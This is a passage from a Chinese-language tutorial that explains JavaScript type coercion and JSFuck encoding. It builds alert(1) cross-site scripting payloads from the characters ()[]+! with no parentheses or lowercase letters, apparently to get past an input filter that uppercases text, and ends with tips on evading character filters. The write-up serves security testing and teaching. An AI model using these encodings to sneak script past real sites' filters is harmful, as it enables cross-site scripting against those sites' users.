  * 一元运算加法、减法,都会转成Number类型。
在看下非原始类型转换规则
`ToPrimitive(input, PreferredType?)`
可选参数PreferredType是Number或者是String。返回值为任何原始值。如果PreferredType是Number，执行顺序如下：
  1. 如果input是原始值,直接返回这个值。
  2. 否则,如果input是对象,调用input.valueOf(),如果结果是原始值,返回结果。
  3. 否则,调用input.toString()。如果结果是原始值,返回结果。
  4. 否则,抛出TypeError。
如果转换的类型是String，2和3会交换执行，即先执行toString()方法。
`ToNumber` 运算符根据下表将其参数转换为数值类型的值
输入类型 | 结果  
---|---  
undefined | NaN  
Null | +0  
Boolean | 如果参数是 true，结果为 1。如果参数是 false，此结果为 +0  
Number | 不转换  
String | "" 转换成 0,"123"转换成"123",无法解析的转换成NaN  
Object | 调用ToPrimitive(input, Number)  
`ToBoolean` 运算符根据下表将其参数转换为布尔值类型的值
输入类型 | 结果  
---|---  
undefined | false  
Null | false  
Boolean | 不转换  
Number | 如果参数是 +0, -0, 或 NaN，结果为 false,否则结果为 true。  
String | 如果参数参数是空字符串（其长度为零），结果为 false，否则结果为 true。  
Object | true  
`ToString` 运算符根据下表将其参数转换为字符串类型的值
输入类型 | 结果  
---|---  
undefined | "undefined"  
Null | "null"  
Boolean | 如果参数是 true，那么结果为 "true"。 如果参数是 false，那么结果为 "false"。  
String | 不转换  
Number | 数字转成字符串 例如 123转成"123"  
Object | 调用ToPrimitive(input, String)  
#### 分解步骤
第一段JS`([][[]]+[])`根据优先级会先执行`[]`,`[]`会定义一个空数组,`[[]]`会定义一个二维数组,那么`[][[]]`就是在一个空数组里面去寻找下标是一个非数字的值,肯定会返回undefined。到这可以分解成undefined+[],因为两把的操作数类型不一致,这里会调用`ToPrimitive`来进行转换
undefined根据上面的规则可以得知会转换成字符串"undefined",这时就是执行`"undefined"+""`,结果就是`"undefined"`字符串。
第二段JS`[+!+[]]`,会先执行里面的`[]`会定义一个空数组,
因为一元运算的原因会从右到左,那么`+[]`就会调用`ToNumber`,因为`[]`是`Object`类型所以会调用`ToPrimitive`,而`[].toString()`会返回`""`字符串,此时会执行`+""`,此时`""`会使用`ToNumber`进行转换,结果会是0。后面接着会用!进行取反,因为0不是`Boolean`类型,会调用`ToBoolean`进行类型转换,会转成`false`,对`false`取反会得到`true`,接着执行`+true`,会用`ToNumber`对`true`进行类型转换,会得到1,那么最终结果就是`[1]`
第三段JS`([]+{})`,`[]`通过`ToPrimitive`会得到`""`字符串,`{}`对象通过`ToPrimitive`会得到`"[object
Object]"`字符串。
第四段JS`[+!+[]+!+[]]`,根据优先级先执行`[]`,`+[]`得到0,`!0`得到`true`,`+true`得到数字1,1+1则等于2,最终结果是`[2]`
最终把这4小段js代码结果拼接起来看下,`"undefined"[1]+"[object Object]"[2]`。执行就会得到字符串`"nb"`。
## 三、分析JSFuck
JSFuck使用六个不同的字符`()[]+!`来编写和执行任意JS代码,在JS基础中讲述了如何通过几个字符来生成任意的字符串,JsFuck不仅只是生成字符串,还可以执行任意JS代码。
    [][(
在控制台执行上面的JS,浏览器会弹出一个对话框内容是1。
经过一步步拆解,最后执行的JS代码是`[]["fill"]["constructor"]("alert(1)")()`,那这段代码为啥会执行`alert(1)`呢,通过控制台分解看下。
`[]["fill"]`获取数组的`fill`方法。在JS中每个函数实际上都是Function
对象,所以能`[]["fill"]["constructor"]`这样去获取`fill`的构造函数,换一个其它的函数也可以的比如`pop`、`map`等等。执行`[]["fill"]["constructor"]("alert(1)")()`相当于执行了`Function('alert(1)')()`
,在Function()构造函数中,最后一个实参所表示的文本是函数体,它可以包含任意的JS语句,使用()调用时所以会执行`alert(1)`,而不是字符串`"alert(1)"`
## 四、去掉括号
在前面的例子中都用到了`()`符号,用来进行分割语法,这里在看一个不用`()`的例子。
    [][[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]][[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]]`$${[!{}+[]][+[]][+!+[]]+[!{}+[]][+[]][+!+[]+!+[]]+[!{}+[]][+[]][+!+[]+!+[]+!+[]+!+[]]+[!![]+[]][+[]][+!+[]]+[!![]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]}$```
最后分解成这样的
    []["constructor"]["constructor"]`$${['false'][0][1]+['false'][0][2]+['false'][0][4]+['true'][0][1]+['true'][0][0]+["function find() { [native code] }"][0][13]+1+["function find() { [native code] }"][0][14]}$```
可以看到`Function`这里用`符号`替换括号。alert(1)这里的括号获取方式是`["function find() { [native code]
}"][0][13]`,这里找了find函数然后转成字符串赋值在数组里面,获取这个字符串的过程是`[[]['find']['constructor'].toString()]`,然后从数组里面取出来字符串,在截取下标位置是13、14,对应(和)符号。$符号是为了定义函数的参数,不加这个语法在解析的时候会报错。
有括号执行`alert(1)`字符串长度是976,没有括号字符长度是1289。前面说过目标服务只是把小写字母转成了大写,大写字母和数字还是可以正常使用的,可以使用数字就不用一个个的加了,可以使用大写字母可以把重复出现的字母定义成变量,这样就不用每次去转换了。
把要出现的字符都集中在一个变量里面
    X=[![]]+!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[];
然后直接取字符串的下标
    [][X[0]+X[19]+X[2]+X[2]][X[12]+X[15]+X[11]+X[3]+X[5]+X[6]+X[7]+X[12]+X[5]+X[15]+X[6]](X[1]+X[2]+X[4]+X[6]+X[5]+'('+1+')')()
执行的时候直接合成一行,整个字符的长度是226
    X=[
浏览器会成功执行`alert(1)`
## 五、总结
在做测试的时候,首先可以确定下对哪些字符进行了过滤,然后再找其它的方法去替换过滤的字符,比如用`符号替换括号,用.join替换+号等等。
* * *